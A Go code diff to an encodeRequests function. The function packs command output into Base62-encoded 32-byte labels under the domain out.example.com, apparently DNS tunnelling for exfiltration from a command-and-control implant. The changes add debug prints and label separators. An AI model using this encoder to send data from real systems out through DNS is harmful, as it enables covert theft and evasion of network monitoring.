@@ -159,24 +159,26 @@ func encodeRequests(packetNumber uint16, cmdOutput []byte) []string {
 			if len(cmdOutput)-i < (32*3 - 2) {
 				bytes[0] = bytes[0] | 128
 			}
+			fmt.Printf("% b", bytes)
+			fmt.Printf("\n")
 			levelBytes = append(levelBytes, bytes...)
 		}
 		//add the current byte
 		levelBytes = append(levelBytes, cmdOutput[i])
-		fmt.Println(len(levelBytes))
 		if len(levelBytes) > 32 {
 			log.Fatal("The maximum number of byte per level is 32")
 		} else if len(levelBytes) == 32 {
 			//Encode the current level
 			builder.WriteString(basen.Base62Encoding.EncodeToString(levelBytes))
+			builder.WriteString(".")
 			levelBytes = levelBytes[:0]
-			fmt.Println(len(levelBytes))
 			nLevels++
 		}
 
 	}
 	if len(levelBytes) > 0 {
 		builder.WriteString(basen.Base62Encoding.EncodeToString(levelBytes))
+		builder.WriteString(".")
 	}
 	builder.WriteString("out.example.com")
 	requests = append(requests, builder.String())
